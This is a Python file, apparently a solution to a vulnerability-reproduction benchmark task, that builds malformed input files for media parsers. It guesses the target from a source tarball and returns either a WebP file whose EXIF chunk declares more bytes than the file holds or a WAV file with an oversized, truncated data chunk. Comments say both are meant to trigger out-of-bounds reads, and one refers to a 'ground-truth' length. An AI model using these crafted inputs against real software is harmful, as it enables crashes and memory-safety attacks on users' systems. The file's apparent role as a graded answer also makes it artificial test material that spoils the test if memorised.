import os
import tarfile
import struct


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Attempt to detect project; default to WebP RIFF PoC
        proj = "webp"
        try:
            if src_path and os.path.exists(src_path):
                with tarfile.open(src_path, "r:*") as tf:
                    names = [m.name.lower() for m in tf.getmembers() if m.isfile()]
                name_join = "\n".join(names)
                if ("webp" in name_join) or ("libwebp" in name_join) or ("vp8x" in name_join):
                    proj = "webp"
                elif ("wav" in name_join) or ("libsndfile" in name_join) or ("dr_wav" in name_join) or ("riff" in name_join and "wave" in name_join):
                    proj = "wav"
        except Exception:
            proj = "webp"

        if proj == "webp":
            # Craft a RIFF WEBP with VP8X followed by an EXIF chunk whose size exceeds the RIFF end.
            # This triggers out-of-bounds read in vulnerable versions that don't check chunk end properly.
            def u32(x):
                return struct.pack("<I", x)

            def u24(x):
                return bytes((x & 0xFF, (x >> 8) & 0xFF, (x >> 16) & 0xFF))

            # RIFF header: size chosen so that VP8X fits but EXIF does not
            riff_size = 22  # riff_end = 8 + 22 = 30; VP8X ends at 30; EXIF lies beyond
            header = b"RIFF" + u32(riff_size) + b"WEBP"

            # VP8X chunk: size 10
            flags = bytes([0x08])  # set EXIF bit (feature flag)
            reserved = b"\x00\x00\x00"
            width_m1 = u24(0)   # canvas width = 1
            height_m1 = u24(0)  # canvas height = 1
            vp8x_payload = flags + reserved + width_m1 + height_m1
            vp8x = b"VP8X" + u32(10) + vp8x_payload

            # EXIF chunk: declare 32 bytes but provide only 20 to cause OOB read
            exif_declared_size = 32
            exif_actual = b"\xFF\xD8\xFF\xE1" + b"\x00" * 16  # 20 bytes (looks like start of EXIF/JPEG APP1)
            exif = b"EXIF" + u32(exif_declared_size) + exif_actual

            poc = header + vp8x + exif
            # Ensure length is 58 bytes (as per ground-truth), though not strictly necessary
            return poc[:58]
        else:
            # Fallback WAV RIFF with oversized data chunk size but truncated actual data
            def u32(x):
                return struct.pack("<I", x)

            riff = b"RIFF"
            wave = b"WAVE"
            fmt_ = b"fmt "
            data = b"data"

            fmt_chunk = fmt_ + u32(16) + struct.pack("<HHIIHH",
                                                     1,     # PCM
                                                     1,     # channels
                                                     8000,  # sample rate
                                                     16000, # byte rate
                                                     2,     # block align
                                                     16)    # bits per sample

            data_declared = 1024
            data_chunk = data + u32(data_declared) + b"\x00" * 6  # truncated data to trigger OOB

            total_size = 4 + len(fmt_chunk) + len(data_chunk)
            header = riff + u32(total_size) + wave

            poc = header + fmt_chunk + data_chunk
            return poc